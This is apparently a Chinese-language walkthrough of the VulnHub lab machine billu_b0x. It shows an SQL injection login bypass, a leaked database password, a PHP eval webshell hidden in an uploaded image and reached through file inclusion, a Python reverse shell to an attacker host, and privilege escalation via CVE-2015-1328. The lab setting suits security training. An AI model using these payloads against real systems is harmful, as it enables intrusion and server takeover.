[https://www.vulnhub.com/entry/billu-b0x,188/](https://www.vulnhub.com/entry/billu-b0x,188/)

`index.php`提示进行sql注入,但使用万能密码进行初步尝试,返回`Try Again`,推测闭合方式不正确或者存在过滤

`dirsearch`扫描得到的主要路径

```
http://172.20.2.129:80/add.php
http://172.20.2.129:80/c.php
http://172.20.2.129:80/index.php
http://172.20.2.129:80/show.php
http://172.20.2.129:80/test.php
http://172.20.2.129:80/head.php
http://172.20.2.129:80/in
http://172.20.2.129/phpmy
```

`http://172.20.2.129/phpmy`跳转到`phpmyadmin`的登录页面

打开`test.php`提示要向其传递`file`参数,推测其可能为文件包含或文件下载,尝试GET传参失败,使用POST传参成功

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/20211104162735.png)

`index.php`关键内容如下

```php
$uname=str_replace('\'','',urldecode($_POST['un']));
$pass=str_replace('\'','',urldecode($_POST['ps']));
$run='select * from auth where  pass=\''.$pass.'\' and uname=\''.$uname.'\'';
```

传入`un= or 1=1#&ps=\`

此时语句为`select * from auth where pass='\' and uname=' or 1=1#'`,pass的内容为`\' and uname=`

成功登录

`in`打开显示为`phpinfo`的内容,`add.php`打开显示存在上传点,但查看源代码后可知其不存在后端

`show.php`

```php
<?php
include('c.php');

if(isset($_POST['continue']))
{
	$run='select * from users ';
	$result = mysqli_query($conn, $run);
if (mysqli_num_rows($result) > 0) {
echo "<table width=90% ><tr><td>ID</td><td>User</td><td>Address</td><td>Image</td></tr>";
 while($row = mysqli_fetch_assoc($result)) 
   {
	   echo '<tr><td>'.$row['id'].'</td><td>'.htmlspecialchars ($row['name'],ENT_COMPAT).'</td><td>'.htmlspecialchars ($row['address'],ENT_COMPAT).'</td><td><img src="uploaded_images/'.htmlspecialchars ($row['image'],ENT_COMPAT).'" height=90px width=100px></td></tr>';
}
   echo "</table>";
}
}

?>
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202111041631621.png)

`c.php`中含有数据库连接密码`$conn = mysqli_connect("127.0.0.1","billu","b0x_billu","ica_lab");`

尝试利用该密码进行登录和ssh连接均失败,使用该密码成功登录`phpmyadmin`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202111041633211.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202111041634143.png)

使用查询得到的用户名和密码成功登录网站

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202111041635215.png)

`panel.php`的内容

```php
<?php
session_start();

include('c.php');
include('head2.php');
if(@$_SESSION['logged']!=true )
{
		header('Location: index.php', true, 302);
		exit();
	
}



echo "Welcome to billu b0x ";
echo '<form method=post style="margin: 10px 0px 10px 95%;"><input type=submit name=lg value=Logout></form>';
if(isset($_POST['lg']))
{
	unset($_SESSION['logged']);
	unset($_SESSION['admin']);
	header('Location: index.php', true, 302);
}
echo '<hr><br>';

echo '<form method=post>

<select name=load>
    <option value="show">Show Users</option>
	<option value="add">Add User</option>
</select> 

 &nbsp<input type=submit name=continue value="continue"></form><br><br>';
if(isset($_POST['continue']))
{
	$dir=getcwd();
	$choice=str_replace('./','',$_POST['load']);
	
	if($choice==='add')
	{
       		include($dir.'/'.$choice.'.php');
			die();
	}
	
        if($choice==='show')
	{
        
		include($dir.'/'.$choice.'.php');
		die();
	}
	else
	{
		include($dir.'/'.$_POST['load']);
	}
	
}


if(isset($_POST['upload']))
{
	
	$name=mysqli_real_escape_string($conn,$_POST['name']);
	$address=mysqli_real_escape_string($conn,$_POST['address']);
	$id=mysqli_real_escape_string($conn,$_POST['id']);
	
	if(!empty($_FILES['image']['name']))
	{
		$iname=mysqli_real_escape_string($conn,$_FILES['image']['name']);
	$r=pathinfo($_FILES['image']['name'],PATHINFO_EXTENSION);
	$image=array('jpeg','jpg','gif','png');
	if(in_array($r,$image))
	{
		$finfo = @new finfo(FILEINFO_MIME); 
	$filetype = @$finfo->file($_FILES['image']['tmp_name']);
		if(preg_match('/image\/jpeg/',$filetype )  || preg_match('/image\/png/',$filetype ) || preg_match('/image\/gif/',$filetype ))
				{
					if (move_uploaded_file($_FILES['image']['tmp_name'], 'uploaded_images/'.$_FILES['image']['name']))
							 {
							  echo "Uploaded successfully ";
							  $update='insert into users(name,address,image,id) values(\''.$name.'\',\''.$address.'\',\''.$iname.'\', \''.$id.'\')'; 
							 mysqli_query($conn, $update);
							  
							}
				}
			else
			{
				echo "<br>i told you dear, only png,jpg and gif file are allowed";
			}
	}
	else
	{
		echo "<br>only png,jpg and gif file are allowed";
		
	}
}


}

?>
```

`include($dir.'/'.$_POST['load']);`存在文件包含,上传一张带有webshell的图片即可

`echo "<?php file_put_contents('uploaded_images/shell.php','<?php eval(\$_POST[a]);?>')?>" >> jack.jpg`

在`uploaded_images/shell.php`中得到一个webshell

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202111041648724.png)

存在python2的环境,利用python2反弹shell

```py
import socket
import subprocess
import os
ip="172.20.2.128"
port=9999
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((ip,port))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202111041701182.png)

有时候在使用`nc -lvvp`时会报错`nc: getnameinfo: Temporary failure in name resolution`

此时应该添加`n`参数,即`nc -lvnp`

使用`CVE-2015-1328`进行提权

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202111041723806.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202111041725713.png)